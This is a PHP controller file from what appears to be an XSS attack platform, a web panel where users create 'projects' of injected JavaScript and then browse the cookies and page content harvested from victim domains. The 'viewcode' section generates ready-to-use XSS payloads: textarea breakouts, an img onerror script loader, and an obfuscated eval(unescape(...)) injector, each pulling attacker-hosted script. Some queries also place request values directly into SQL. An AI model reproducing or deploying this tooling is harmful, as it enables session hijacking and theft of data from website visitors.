<?php
/**
 * project.php 项目
 * ----------------------------------------------------------------
 * OldCMS,site:http://www.oldcms.com
 */
if (!defined('IN_OLDCMS')) {
    die('Access Denied');
}
if ($user->userId <= 0) {
    $user->ToLogin();
}

$act = Val('act', 'GET');
switch ($act) {
case 'create':
    include 'common.php';
    $smarty = InitSmarty();
    $smarty->assign('do', $do);
    $smarty->assign('show', $show);
    $smarty->assign('url', $url);
    $smarty->assign('projects', $projects);
    $smarty->assign('modules', $modules);
    $smarty->display('project_create.html');
    break;
case 'create_submit':
    if (!$user->CheckToken(Val('token', 'POST'))) {
        ShowError('操作失败');
    }
    $title = Val('title', 'POST');
    $description = Val('description', 'POST');
    if (empty($title)) {
        ShowError('项目名称不能为空', URL_ROOT . '/index.php?do=project&act=create');
    }
    $db = DBConnect();
    //生成短网址字符
    $existedStrs = $db->FirstColumn("SELECT urlKey FROM " . Tb('project') . "");
    $urlKey = ShortUrlCode($existedStrs);
    //生成authCode
    $authCode = md5('xsser_' . $urlKey . '_' . $user->userId . '_' . time());
    $values = array(
        'title' => $title,
        'description' => $description,
        'userId' => $user->userId,
        'urlKey' => $urlKey,
        'authCode' => $authCode,
        'addTime' => time()
    );
    $db->AutoExecute(Tb('project'), $values);
    $projectId = $db->LastId();
    //ShowSuccess('创建成功');
    header("Location: " . URL_ROOT . '/index.php?do=project&act=setcode&ty=create&id=' . $projectId);
    break;
case 'setcode':
    $db = DBConnect();
    $id = Val('id', 'GET', 1);
    $ty = Val('ty', 'GET');
    $project = $db->FirstRow("SELECT * FROM " . Tb('project') . " WHERE id='{$id}' AND userId='" . $user->userId . "'");
    if (empty($project)) {
        ShowError('项目不存在或没有权限');
    }
    //可使用的模块
    $modulesCan = $db->Dataset("SELECT * FROM " . Tb('module') . " WHERE (isOpen=1 AND isAudit=1) OR userId='" . $user->userId . "'");
    //已使用的模块
    $moduleSetKeys = json_decode($project['moduleSetKeys'], true);

    $myModules = array();
    if (!empty($project['modules'])) {
        $myModules = (array)json_decode($project['modules'], true);
    }
    foreach ($modulesCan as $k => $v) {
        $modulesCan[$k]['keys'] = (array)json_decode($v['keys'], true);
        $modulesCan[$k]['keys'] = implode(',', $modulesCan[$k]['keys']);
        if (in_array($v['id'], $myModules)) {
            $modulesCan[$k]['choosed'] = 1;
        }
        //是否有要配置的参数
        if (!empty($v['setkeys'])) {
            $setkeysK = (array)json_decode($v['setkeys'], true);
            $setkeys = array();
            foreach ($setkeysK as $kv) {
                $kRow['key'] = $kv;
                if (!empty($moduleSetKeys["setkey_{$v['id']}_{$kv}"])) {
                    $kRow['value'] = urldecode($moduleSetKeys["setkey_{$v['id']}_{$kv}"]);
                }
                $setkeys[] = $kRow;
            }
            $modulesCan[$k]['setkeys'] = $setkeys;
        }
    }
    include 'common.php';
    $smarty = InitSmarty();
    $smarty->assign('do', $do);
    $smarty->assign('show', $show);
    $smarty->assign('url', $url);
    $smarty->assign('project', $project);
    $smarty->assign('modulesCan', $modulesCan);
    $smarty->assign('projects', $projects);
    $smarty->assign('modules', $modules);
    $smarty->assign('ty', $ty);
    $smarty->display('project_setcode.html');
    break;
case 'setcode_submit':
    if (!$user->CheckToken(Val('token', 'POST'))) {
        ShowError('操作失败');
    }
    $id = Val('id', 'POST', 1);
    $ty = Val('ty', 'POST');
    $db = DBConnect();
    $project = $db->FirstRow("SELECT * FROM " . Tb('project') . " WHERE id='{$id}' AND userId='" . $user->userId . "'");
    if (empty($project)) {
        ShowError('项目不存在或没有权限');
    }
    //模块
    $modules = Val('modules', 'POST', 1, 1);
    $code = Val('code', 'POST');
    $values = array(
        'code' => $code
    );
    if (!empty($modules)) {
        $values['modules'] = JsonEncode($modules);
        $moduleSetKeys = array();
        //配置的参数
        foreach ($modules as $mId) {
            $module = $db->FirstRow("SELECT * FROM " . Tb('module') . " WHERE id='{$mId}'");
            if (!empty($module) && !empty($module['setkeys'])) {
                $mSetKeys = (array)json_decode($module['setkeys'], true);
                foreach ($mSetKeys as $setkey) {
                    $setkeyK = "setkey_{$mId}_{$setkey}";
                    $setkeyV = Val($setkeyK, 'POST');
                    if (!empty($setkeyV)) {
                        $moduleSetKeys["$setkeyK"] = urlencode($setkeyV);
                    }
                }
            }
        }
        $values['moduleSetKeys'] = JsonEncode($moduleSetKeys);
    }
    $db->AutoExecute(Tb('project'), $values, 'UPDATE', " id='{$id}'");
    if ($ty == 'create') {
        header("Location: " . URL_ROOT . '/index.php?do=project&act=viewcode&ty=create&id=' . $id);
    } else {
        ShowSuccess('操作成功');
    }
    break;
case 'view':
    $id = Val('id', 'GET', 1);
    $db = DBConnect();
    $project = $db->FirstRow("SELECT * FROM " . Tb('project') . " WHERE id='{$id}' AND userId='" . $user->userId . "'");
    if (empty($project)) {
        ShowError('项目不存在或没有权限');
    }
    $domain = Val('domain', 'GET');
    $where = '';
    if (!empty($domain)) {
        $where .= " AND domain='{$domain}'";
    }
    $domains = array(); //域名列表
    //读取项目获取的内容
    $contents = $db->Dataset("SELECT id,projectId,serverContent,content,domain,addTime FROM " . Tb('project_content') . " WHERE projectId='{$id}' {$where} ORDER BY id DESC");

    foreach ($contents as $k => $v) {
        $contents[$k]['content'] = json_decode($v['content']);
        if (empty($contents[$k]['content'])) {
            $contents[$k]['content'] = StripStr($v['content']);
        }
        $contents[$k]['serverContent'] = json_decode($v['serverContent']);
        $contents[$k]['serverContent'] = array_map('StripStr', (array)$contents[$k]['serverContent']);
        if (!empty($v['domain']) && !in_array($v['domain'], $domains)) {
            $domains[] = $v['domain'];
        }
    }

    include 'common.php';
    $smarty = InitSmarty();
    $smarty->assign('do', $do);
    $smarty->assign('show', $show);
    $smarty->assign('url', $url);
    $smarty->assign('project', $project);
    $smarty->assign('contents', $contents);
    $smarty->assign('domain', $domain);
    $smarty->assign('domains', $domains);
    $smarty->assign('projects', $projects);
    $smarty->assign('modules', $modules);
    $smarty->display('project_view.html');
    break;
case 'viewcode':
    $id = Val('id', 'GET', 1);
    $ty = Val('ty', 'GET');
    $db = DBConnect();
    $project = $db->FirstRow("SELECT * FROM " . Tb('project') . " WHERE id='{$id}' AND userId='" . $user->userId . "'");
    if (empty($project)) {
        ShowError('项目不存在或没有权限');
    }
    $code = '';
    $moduleSetKeys = json_decode($project['moduleSetKeys'], true);
    /* 模块 begin */
    $moduleIds = array();
    if (!empty($project['modules'])) {
        $moduleIds = json_decode($project['modules']);
    }
    if (!empty($moduleIds)) {
        $modulesStr = implode(',', $moduleIds);
        $modules = $db->Dataset("SELECT * FROM " . Tb('module') . " WHERE id IN ($modulesStr)");
        if (!empty($modules)) {
            foreach ($modules as $module) {
                $module['code'] = str_replace('{projectId}', $project['urlKey'], $module['code']);
                //module里是否有配置的参数
                if (!empty($module['setkeys'])) {
                    $setkeys = json_decode($module['setkeys'], true);
                    foreach ($setkeys as $setkey) {
                        $module['code'] = str_replace(
                            '{set.' . $setkey . '}',
                            $moduleSetKeys["setkey_{$module['id']}_{$setkey}"] ?? '', $module['code']
                        );
                    }
                }
                $code .= $module['code'];
            }
        }
    }
    /* 模块 end */
    /* 项目自定义代码 */
    $codeurl = URL_ROOT . "/{$project['urlKey']}?" . time();

    //$codeurl=LongUrltoShortUrl($codeurl);
    $code .= $project['code'];
    //$scriptShow1=StripStr("</textarea>'\"><script src=".URL_ROOT."/{$project[urlKey]}?".time()."></script>");

    //转短地址
    $longUrl = URL_ROOT . "/" . $project['urlKey'] . "?" . time();
    $longUrl2 = URL_ROOT . "/" . $project['urlKey'] . "?";
    $shortUrl = LongUrltoShortUrl($longUrl);//短网址1
    $shortShow1 = StripStr("<script src=" . $shortUrl . "></script>");
    $shortShow3 = StripStr("<img src=x onerror=s=createElement('script');body.appendChild(s);s.src='你的js地址';>");
    $scriptShow1 = StripStr("</textarea>'\"><script src=" . $longUrl . "></script>");
    //$scriptShow1=StripStr("</textarea>'\"><script src=".URL_ROOT."/{$project[urlKey]}?".time()."></s
    //    cript>");
    $code2 = 'var b=document.createElement("script");b.src="' . $longUrl2 . '"+Math.random();(document.getElementsByTagName("HEAD")[0]||document.body).appendChild(b);';
    //$code2='var b=document.createElement("script");b.src="'.URL_ROOT."/{$project[urlKey]}?".'"+Math.random();(document.getElementsByTagName("HEAD")[0]||document.body).appendChild(b);';
    $scriptShow2 = StripStr("</textarea>'\"><img src=# id=xssyou style=display:none onerror=eval(unescape(/" . rawurlencode($code2) . "/.source));//>");

    include 'common.php';
    $smarty = InitSmarty();
    $smarty->assign('do', $do);
    $smarty->assign('show', $show);
    $smarty->assign('url', $url);
    $smarty->assign('project', $project);
    $smarty->assign('code', $code);
    $smarty->assign('codeurl', $codeurl);
    $smarty->assign('scriptShow1', $scriptShow1);
    $smarty->assign('scriptShow2', $scriptShow2);
    $smarty->assign('projects', $projects);
    $smarty->assign('modules', $modules);
    $smarty->assign('ty', $ty);
    $smarty->assign('shortShow1', $shortShow1);
    $smarty->assign('shortShow3', $shortShow3);
    $smarty->display('project_viewcode.html');
    break;
case 'delete':
    if (!$user->CheckToken(Val('token', 'GET'))) {
        ShowError('操作失败');
    }
    $id = Val('id', 'GET', 1);
    $db = DBConnect();
    $project = $db->FirstRow("SELECT * FROM " . Tb('project') . " WHERE id='{$id}' AND userId='" . $user->userId . "'");
    if (empty($project)) {
        ShowError('项目不存在或没有权限');
    }
    //删除相关的keepsession
    $db->Execute("DELETE FROM " . Tb('keepsession') . " WHERE projectId='{$id}'");
    $db->Execute("DELETE FROM " . Tb('project') . " WHERE id='{$id}'");
    ShowSuccess('操作成功');
    break;
case 'delcontent':
    if (!$user->CheckToken(Val('token', 'POST'))) {
        ShowError('操作失败');
    }
    $id = Val('id', 'POST');
    $db = DBConnect();
    $content = $db->FirstRow("SELECT pc.projectId FROM " . Tb('project_content') . " pc INNER JOIN " . Tb('project') . " p ON p.id=pc.projectId WHERE p.userId='" . $user->userId . "' AND pc.id='{$id}'");
    if (!empty($content)) {
        $db->Execute("DELETE FROM " . Tb('project_content') . " WHERE id='{$id}'");
    }
    echo 1;
    break;
case 'delcontents':
    if (!$user->CheckToken(Val('token', 'POST'))) {
        ShowError('操作失败');
    }
    $ids = Val('ids', 'POST');
    $ids = explode('|', $ids);
    //删除
    $db = DBConnect();
    foreach ($ids as $id) {
        $content = $db->FirstRow("SELECT pc.projectId FROM " . Tb('project_content') . " pc INNER JOIN " . Tb('project') . " p ON p.id=pc.projectId WHERE p.userId='" . $user->userId . "' AND pc.id='{$id}'");
        if (!empty($content)) {
            $db->Execute("DELETE FROM " . Tb('project_content') . " WHERE id='{$id}'");
        }
    }
    echo 1;
    break;
default:
    break;
}
?>
